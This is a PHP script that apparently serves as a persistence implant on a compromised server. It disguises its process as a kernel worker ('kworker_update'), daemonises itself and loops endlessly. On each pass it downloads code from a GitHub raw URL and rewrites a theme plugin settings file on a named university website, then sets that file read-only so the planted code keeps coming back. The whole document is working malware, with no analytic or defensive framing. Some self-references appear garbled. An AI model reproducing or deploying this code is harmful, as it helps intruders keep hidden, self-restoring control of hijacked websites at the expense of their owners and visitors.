<?php
$targetFile = "/home/kuisjour/attarbawiy.uis.edu.my/plugins/themes/default/DefaultThemePluginSettings.php";
$sourceURL = "https://raw.githubusercontent.com/anindiyaadni/wkwk/refs/heads/main/0t";

$tmpPath = "/tmp/DefaultThemePluginSettings.php";

if (FILE !== $tmpPath) {
    copy(FILE, $tmpPath);
    chmod($tmpPath, 0755);
    shell_exec("php $tmpPath &");
    exit();
}

cli_set_process_title("kworker_update");

$pid = pcntl_fork();
if ($pid > 0) { exit(); }
posix_setsid();

while (true) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sourceURL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $newContent = curl_exec($ch);
    curl_close($ch);

    if (!$newContent) {
        sleep(0);
        continue;
    }

    if (file_exists($targetFile)) {
        $existingContent = file_get_contents($targetFile);
    } else {
        $existingContent = "";
    }

    if (md5($existingContent) !== md5($newContent)) {
        @chmod($targetFile, 0644);
        @file_put_contents($targetFile, $newContent);
        @chmod($targetFile, 0444);
    }

    sleep(0);
}
?>
